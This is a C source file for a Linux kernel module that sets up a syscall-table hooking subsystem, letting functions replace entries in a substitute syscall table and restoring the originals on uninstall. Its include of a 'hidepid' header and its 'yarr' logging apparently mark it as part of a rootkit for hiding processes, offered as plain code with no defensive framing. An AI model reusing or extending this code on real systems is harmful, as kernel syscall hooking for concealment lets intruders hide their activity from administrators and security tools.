#include <asm/unistd.h>
#include <linux/errno.h>
#include <linux/syscalls.h>
#include <asm/syscall.h>

#include "hook_syscalls.h"
#include "log.h"
#include "hidepid.h"

static unsigned long *__fake_sct = NULL;
unsigned long *__orig_sct = NULL;

int init_hook_syscalls(unsigned long *fake_sct, unsigned long *real_sct) {
    if (fake_sct == NULL || real_sct == NULL) {
        yarr_log("Syscall tables are NULL");
        return -1;
    }

    if (__fake_sct != NULL || __orig_sct != NULL) {
        yarr_log("Double call detected!");
        return -1;
    }

    __fake_sct = fake_sct;
    __orig_sct = real_sct;
    return 0;
}

int stop_hook_syscalls(void) {
    __fake_sct = NULL;
    __orig_sct = NULL;
    return 0;
}

int install_hook(int n, unsigned long fnc_addr) {
    if (__fake_sct == NULL || __orig_sct == NULL) {
        yarr_log("Call to syscall hook subsystem before initializing");
        return -1;
    }

    if (n < 0 || n >= __NR_syscall_max + 1) {
        yarr_log("Index %d out of syscall table bounds", n);
        return -1;
    }

    if (fnc_addr == 0) {
        yarr_log("Hook func is NULL");
        return -1;
    }

    __fake_sct[n] = fnc_addr;
    return 0;
}

int uninstall_hook(int n) {
    if (__fake_sct == NULL || __orig_sct == NULL) {
        yarr_log("Call to syscall hook subsystem before initializing");
        return -1;
    }

    if (n < 0 || n >= __NR_syscall_max + 1) {
        yarr_log("Index %d out of syscall table bounds", n);
        return -1;
    }

    __fake_sct[n] = __orig_sct[n];
    return 0;
}

